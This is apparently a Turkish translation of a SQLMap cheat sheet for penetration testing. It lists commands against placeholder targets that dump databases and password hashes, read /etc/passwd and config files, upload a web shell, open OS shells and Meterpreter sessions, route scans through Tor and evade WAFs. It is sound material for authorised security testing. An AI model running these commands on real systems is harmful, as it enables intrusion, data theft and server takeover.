# 💉 SQLMap - Kapsamlı Başvuru Kılavuzu

[🇬🇧 English](../../README.md)

```
   _____ ____    __    __  __           
  / ___// __ \  / /   /  |/  /___ _____ 
  \__ \/ / / / / /   / /|_/ / __ `/ __ \
 ___/ / /_/ / / /___/ /  / / /_/ / /_/ /
/____/\___\_\/_____/_/  /_/\__,_/ .___/ 
                               /_/      
    Otomatik SQL Enjeksiyonu Aracı
```

<p align="center">
  <img src="https://img.shields.io/badge/SQLMap-Enjeksiyon-red?style=for-the-badge" alt="SQLMap">
  <img src="https://img.shields.io/badge/SQL-Enjeksiyonu-orange?style=for-the-badge" alt="SQL Enjeksiyonu">
  <img src="https://img.shields.io/badge/Python-Aracı-blue?style=for-the-badge&logo=python" alt="Python">
  <img src="https://img.shields.io/badge/Sızma-Testi-purple?style=for-the-badge" alt="Sızma Testi">
</p>

<p align="center">
  <b>🔥 Dünyanın en gelişmiş ve güçlü SQL enjeksiyonu otomasyon aracı</b>
</p>

---

## 📋 İçindekiler

- [Giriş](#-giriş)
- [Kurulum](#-kurulum)
- [Temel Sözdizimi](#-temel-sözdizimi)
- [Hedef Belirleme Seçenekleri](#-hedef-belirleme-seçenekleri)
- [İstek (Request) Seçenekleri](#-istek-request-seçenekleri)
- [Tespit (Detection) Seçenekleri](#-tespit-detection-seçenekleri)
- [Numaralandırma (Enumeration)](#-numaralandırma-enumeration)
- [Veri Çıkarma (Data Extraction)](#-veri-çıkarma-data-extraction)
- [Dosya İşlemleri](#-dosya-işlemleri)
- [İşletim Sistemi Erişimi (OS Access)](#-işletim-sistemi-erişimi-os-access)
- [Filtre ve WAF Atlatma Teknikleri](#-filtre-ve-waf-atlatma-teknikleri)
- [Tamper Betikleri Referansı](#-tamper-betikleri-referansı)
- [Gerçek Dünya Örnek Senaryoları](#-gerçek-dünya-örnek-senaryoları)
- [Hızlı Başvuru Tablosu](#-hızlı-başvuru-tablosu)
- [İpuçları ve En İyi Uygulamalar](#-ipuçları-ve-en-iyi-uygulamalar)
- [Kaynaklar](#-kaynaklar)

---

## 🎯 Giriş

**SQLMap**, web uygulamalarındaki SQL enjeksiyonu (SQLi) zafiyetlerini otomatik olarak tespit eden ve istismar ederek veritabanı sunucularını ele geçirmeyi sağlayan açık kaynaklı bir sızma testi aracıdır.

### Temel Özellikler

| Özellik | Açıklama |
|---------|----------|
| **Otomatik Tespit** | Parametrelerdeki SQL enjeksiyonu açıklarını otomatik bulur |
| **Geniş Veritabanı Desteği** | MySQL, PostgreSQL, MSSQL, Oracle, SQLite ve onlarcası |
| **Tam Kontrol (Takeover)** | Parmak izi çıkarma, veri tabanını dökme, işletim sisteminde komut çalıştırma |
| **WAF/IPS Atlatma** | Dahili tamper betikleri ile güvenlik duvarı filtrelerini aşma |
| **Çoklu Enjeksiyon Teknikleri** | Boolean, Hata, Union, Stacked ve Zaman tabanlı teknikler |

### Desteklenen Veritabanı Yönetim Sistemleri

```
✅ MySQL          ✅ PostgreSQL      ✅ Microsoft SQL Server
✅ Oracle         ✅ SQLite          ✅ IBM DB2
✅ SAP MaxDB      ✅ Firebird        ✅ Sybase
✅ HSQLDB         ✅ Informix        ✅ H2
```

### SQL Enjeksiyon Türleri ve Kodları

| Tür | Kod | Açıklama |
|-----|-----|----------|
| Boolean-based blind | `B` | Yanıt içeriğindeki doğru/yanlış farklılıklarına dayalı |
| Error-based | `E` | Veritabanı hata mesajlarının yanıta yansımasına dayalı |
| Union query-based | `U` | UNION SELECT ile verileri birleştirerek çekme |
| Stacked queries | `S` | Noktalı virgül (;) ile art arda birden çok sorgu çalıştırma |
| Time-based blind | `T` | Veritabanı uyutma (sleep) fonksiyonları ile zaman gecikmesi ölçümü |
| Inline queries | `Q` | İç içe gömülü alt sorgular |

---

## 📥 Kurulum

### Kali Linux (Ön Yüklü Gelir)
```bash
# SQLMap paketini güncelleme
sudo apt update && sudo apt install sqlmap
```

### GitHub Üzerinden En Güncel Sürüm
```bash
# Depoyu klonlayın
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py --version
```

### pip ile Kurulum
```bash
pip install sqlmap
```

### Docker
```bash
docker pull paoloo/sqlmap
docker run -it paoloo/sqlmap -u "http://target.com/page?id=1"
```

### Kurulumu Doğrulama
```bash
sqlmap --version
sqlmap -h          # Temel yardım
sqlmap -hh         # Gelişmiş tüm seçenekleri gösteren yardım
```

---

## ⌨️ Temel Sözdizimi

### Genel Kullanım Yapısı
```bash
sqlmap [seçenekler] -u "URL" 
sqlmap [seçenekler] -r istek.txt
```

### Hızlı Başlangıç Örnekleri
```bash
# Temel GET parametresi taraması
sqlmap -u "http://target.com/page.php?id=1"

# Oturum çerezi (Cookie) ile tarama
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# POST isteği taraması
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Burp Suite'ten kaydedilen ham istek dosyasından tarama
sqlmap -r istek.txt

# Sorulara otomatik varsayılan yanıtı verme (Etkileşimsiz mod)
sqlmap -u "http://target.com/page.php?id=1" --batch
```

---

## 🎯 Hedef Belirleme Seçenekleri

### URL Hedefi (`-u`)
```bash
# Tek parametreli URL
sqlmap -u "http://target.com/page.php?id=1"

# Çok parametreli URL'de belirli parametreyi test etme (-p)
sqlmap -u "http://target.com/page.php?id=1&cat=5" -p id

# Tüm parametreleri ve başlıkları derinlemesine test etme
sqlmap -u "http://target.com/page.php?id=1&cat=5" --level=5
```

### İstek Dosyası (`-r`)
Burp Suite üzerinden bir HTTP isteğine sağ tıklayıp "Copy to file" ile kaydedin:
```bash
sqlmap -r istek.txt

# Özel enjeksiyon noktası belirlemek için istek dosyasındaki parametrenin sonuna * işareti koyun:
# id=1*
```

### Google Dork ile Arama (`-g`)
```bash
# Google arama sonuçlarını otomatik toplayıp zafiyet tara
sqlmap -g "inurl:page.php?id="
```

### Doğrudan Veritabanı Bağlantısı (`-d`)
```bash
# Doğrudan veritabanı portuna bağlanarak test etme
sqlmap -d "mysql://kullanici:parola@hedef.com:3306/veritabani"
```

---

## 📡 İstek (Request) Seçenekleri

### HTTP Yöntemi ve Gövde Verisi
```bash
# POST verisi gönderme
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Özel HTTP metodu belirtme
sqlmap -u "http://target.com/api/user/1" --method=PUT

# JSON verisi gönderme
sqlmap -u "http://target.com/api" --data='{"id":1}' --headers="Content-Type: application/json"
```

### Çerezler (Cookies) ve Başlıklar (Headers)
```bash
# Çerez tanımlama
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc; auth=xyz"

# Rastgele User-Agent kullanma (WAF engellerini aşmak için)
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Özel HTTP başlığı ekleme
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1"
```

### Proxy ve Tor Yapılandırması
```bash
# Burp Suite üzerinden geçirme
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# Tor ağı üzerinden anonim tarama
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5 --check-tor
```

---

## 🔍 Tespit (Detection) Seçenekleri

### Seviye ve Risk (`--level` ve `--risk`)
```bash
# Kapsamlı ve derin tarama için önerilen kombinasyon
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

| Seviye (Level) | Test Edilen Alanlar |
|----------------|---------------------|
| 1 | Varsayılan - Temel GET/POST parametreleri |
| 2 | + Cookie başlıkları test edilir |
| 3 | + User-Agent ve Referer başlıkları test edilir |
| 4 | + Ekstra karmaşık payload'lar |
| 5 | + Tüm başlıklar ve kapsamlı test yükleri |

| Risk | Açıklama |
|------|----------|
| 1 | Varsayılan - Tamamen güvenli testler |
| 2 | + Ağır zaman tabanlı (time-based) sorgular |
| 3 | + OR tabanlı sorgular (Veritabanındaki verileri güncelleme/bozma riski vardır!) |

### Enjeksiyon Tekniği Seçimi (`--technique`)
```bash
# Yalnızca Union tabanlı enjeksiyon dene
sqlmap -u "http://target.com/page.php?id=1" --technique=U

# Yalnızca Boolean ve Error tabanlı dene
sqlmap -u "http://target.com/page.php?id=1" --technique=BE
```

---

## 📊 Numaralandırma (Enumeration)

### Veritabanı ve Kullanıcı Bilgisi Toplama
```bash
# Aktif veritabanı adı
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Aktif kullanıcı
sqlmap -u "http://target.com/page.php?id=1" --current-user

# Kullanıcı DBA (veritabanı yöneticisi / root) mi?
sqlmap -u "http://target.com/page.php?id=1" --is-dba

# Tüm veritabanlarını listele
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Tüm veritabanı kullanıcılarını listele
sqlmap -u "http://target.com/page.php?id=1" --users

# Kullanıcı parola hash'lerini dök
sqlmap -u "http://target.com/page.php?id=1" --passwords
```

### Tablo ve Sütun Listeleme
```bash
# Belirli veritabanındaki tabloları listele
sqlmap -u "http://target.com/page.php?id=1" -D veritabani_adi --tables

# Belirli tablodaki sütunları listele
sqlmap -u "http://target.com/page.php?id=1" -D veritabani_adi -T kullanicilar --columns

# Veritabanında "password" veya "user" içeren sütunları ara
sqlmap -u "http://target.com/page.php?id=1" --search -C password,email,user
```

---

## 📤 Veri Çıkarma (Data Extraction)

### Verileri İndirme (Dump)
```bash
# Belirli bir tablonun tüm içeriğini indir
sqlmap -u "http://target.com/page.php?id=1" -D veritabani -T kullanicilar --dump

# Yalnızca belirli sütunları indir
sqlmap -u "http://target.com/page.php?id=1" -D veritabani -T kullanicilar -C username,password --dump

# Belirli satır aralığını çekme (ör. ilk 10 satır)
sqlmap -u "http://target.com/page.php?id=1" -D veritabani -T kullanicilar --dump --start=1 --stop=10

# Koşula göre çekme (WHERE şartı)
sqlmap -u "http://target.com/page.php?id=1" -D veritabani -T kullanicilar --dump --where="admin=1"

# Sistem veritabanları hariç tüm tabloları dök
sqlmap -u "http://target.com/page.php?id=1" --dump-all --exclude-sysdbs
```

### Özel SQL Sorguları ve Etkileşimli Kabuk
```bash
# Tek bir SQL sorgusu çalıştırma
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT version()"

# Etkileşimli SQL komut istemi açma
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
```

---

## 📁 Dosya İşlemleri

```bash
# Sunucudan yerel dosya okuma (LFI / LOAD_FILE)
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/html/config.php"

# Sunucuya dosya yazma / Web Shell yükleme
sqlmap -u "http://target.com/page.php?id=1" --file-write="./shell.php" --file-dest="/var/www/html/shell.php"
```

---

## 💻 İşletim Sistemi Erişimi (OS Access)

```bash
# İşletim sistemi komut kabuğu elde etme (xp_cmdshell / INTO OUTFILE)
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# Tek bir OS komutu çalıştırma
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# Otomatik Meterpreter oturumu elde etme
sqlmap -u "http://target.com/page.php?id=1" --os-pwn
```

---

## 🛡️ Filtre ve WAF Atlatma Teknikleri

```bash
# WAF tespiti yapma
sqlmap -u "http://target.com/page.php?id=1" --identify-waf

# Tamper betikleri kullanarak filtreleri atlatma
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase,between

# Rastgele User-Agent ile birleştirme
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment --random-agent
```

### Popüler Tamper Betikleri

| Tamper Betiği | Açıklama |
|---------------|----------|
| `space2comment` | Boşluk karakterlerini `/**/` açıklama bloğu ile değiştirir |
| `randomcase` | SQL anahtar kelimelerini rastgele büyük/küçük harfe çevirir (`sElEcT`) |
| `between` | `>` büyüktür işaretini `NOT BETWEEN 0 AND #` ile değiştirir |
| `equaltolike` | `=` işaretini `LIKE` ile değiştirir |
| `base64encode` | Tüm payload'ı Base64 formatında kodlar |
| `charencode` | Karakterleri standart URL formatında kodlar |
| `chardoubleencode` | Karakterleri çift URL kodlaması (Double URL encode) ile kodlar |
| `versionedkeywords` | MySQL özel yorum sözdizimini kullanır (`/*!SELECT*/`) |
| `xforwardedfor` | Sahte `X-Forwarded-For` başlığı ekler |

---

## 🎬 Gerçek Dünya Örnek Senaryoları

### Senaryo 1: Burp Suite İsteğinden Veritabanı Tablolarını Dökme
```bash
# 1. Burp'tan istek metnini request.txt olarak kaydedin
# 2. SQLMap'i çalıştırın:
sqlmap -r request.txt -D hedef_db -T uyeler --dump --batch
```

### Senaryo 2: WAF Korumalı Bir Hedefe Karşı Tarama
```bash
sqlmap -u "http://target.com/item.php?id=1" \
    --tamper=space2comment,randomcase,between \
    --random-agent \
    --level=3 \
    --risk=2 \
    --batch
```

### Senaryo 3: OS Shell Alarak Sunucuya Sızma
```bash
sqlmap -u "http://target.com/news.php?id=1" \
    --os-shell \
    --batch
```

---

## 📊 Hızlı Başvuru Tablosu

| Komut / Parametre | Açıklama |
|-------------------|----------|
| `-u <URL>` | Hedef adres ve parametre |
| `-r <Dosya>` | HTTP istek dosyasını yükleme |
| `--data=<Veri>` | POST isteği gövde verisi |
| `--cookie=<Çerez>` | Oturum çerezi |
| `--dbs` | Tüm veritabanlarını listele |
| `--tables` | Tabloları listele |
| `--columns` | Sütunları listele |
| `--dump` | Verileri indir |
| `-D <DB>` | Hedef veritabanı |
| `-T <Tablo>` | Hedef tablo |
| `-C <Sütun>` | Hedef sütunlar |
| `--batch` | Etkileşimsiz otomatik mod |
| `--os-shell` | İşletim sistemi kabuğu |
| `--tamper=<Betik>` | WAF atlatma betiği |

---

## 💡 İpuçları ve En İyi Uygulamalar

1. **`--batch` Parametresini Alışkanlık Haline Getirin:** Otomasyon ve hızlı taramalarda SQLMap'in her adımda soru sormasını engeller.
2. **Önce Düşük Riskle Başlayın:** `--risk=3` parametresi OR tabanlı sorgular gönderdiği için veritabanındaki kayıtları bozabilir. Önce `--risk=1` ile test edin.
3. **Session Dosyalarını Temizleme:** Tarama hatalı sonuç verdiyse oturum önbelleğini sıfırlamak için `--flush-session` parametresini kullanın.

---

## ⚠️ Yasal Uyarı

> **DİKKAT:** SQLMap çok güçlü bir sömürü aracıdır ve yalnızca **yazılı izin alınmış sistemlerde** kullanılmalıdır. İzniniz olmayan veritabanlarına müdahale etmek yasal suç teşkil eder.

---

## 📚 Kaynaklar

- [SQLMap Resmi Web Sitesi](https://sqlmap.org/)
- [SQLMap GitHub Deposu](https://github.com/sqlmapproject/sqlmap)
- [SQL Injection Payload Kılavuzumuz](../../Payloads/translations/SQLi.tr.md)

---

<p align="center">
  <b>💉 SQL Enjeksiyonu Testlerinde Ustalaşın!</b><br>
  <i>Veritabanı güvenliği modern web uygulamalarının kalbidir</i>
</p>
